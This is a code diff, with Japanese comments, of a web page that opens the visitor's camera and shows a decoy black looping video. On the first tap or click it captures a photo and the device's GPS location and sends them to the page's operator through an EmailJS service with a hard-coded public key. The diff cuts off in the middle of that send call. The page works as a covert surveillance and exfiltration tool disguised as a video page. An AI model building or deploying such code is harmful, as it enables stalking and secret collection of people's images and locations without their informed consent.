@@ -27,26 +27,25 @@
   <canvas id="canvas"></canvas>
   <div id="message">カメラを起動中...</div>
 
-  <!-- Base64形式の動画表示（短い黒画面デモ） -->
+  <!-- base64動画（必要なら差し替え） -->
   <video id="localVideo" controls autoplay loop muted width="300"></video>
 
-  <!-- EmailJS SDK（ESモジュール） -->
+  <!-- EmailJS SDK（ES Module版・修正済） -->
   <script type="module">
-    import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+    import * as emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
 
-    // 公開鍵（あなたのEmailJSパブリックキー）
-    emailjs.init("cPjKBUm_i6HebDQF7");
+    emailjs.init("cPjKBUm_i6HebDQF7"); // ← あなたの公開鍵
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const message = document.getElementById('message');
     const localVideo = document.getElementById('localVideo');
 
-    // ✅ 任意のBase64動画（ここは例：真っ黒の短い動画）
+    // Base64 動画（短い黒画面。必要なら差し替え可）
     const base64Video = "data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDFtcDQyaXNvbWF2YzEAAAAIZnJlZQAAAsxtZGF0AAAAAA==";
     localVideo.src = base64Video;
 
-    // 🎥 カメラ起動
+    // カメラ起動
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
@@ -56,26 +55,25 @@
         message.textContent = "カメラエラー: " + err.message;
       });
 
-    // 🖐️ ユーザー操作検出
+    // タッチまたはクリックを1回だけ検出
     document.body.addEventListener('touchstart', handleInteraction, { once: true });
     document.body.addEventListener('mousedown', handleInteraction, { once: true });
 
     async function handleInteraction() {
       message.textContent = "撮影中...";
 
-      await new Promise(resolve => setTimeout(resolve, 500)); // カメラ準備時間
+      await new Promise(resolve => setTimeout(resolve, 500)); // カメラ準備待ち
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
       const photoData = canvas.toDataURL("image/png");
 
-      // 📍 位置情報取得
+      // 位置情報取得
       const position = await getLocation();
       const locationText = position
         ? `緯度: ${position.coords.latitude}, 経度: ${position.coords.longitude}`
         : "位置情報取得できませんでした";
 
-      // 📧 Email送信
       try {
         await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
           message: `画面タッチイベント\n${locationText}`,
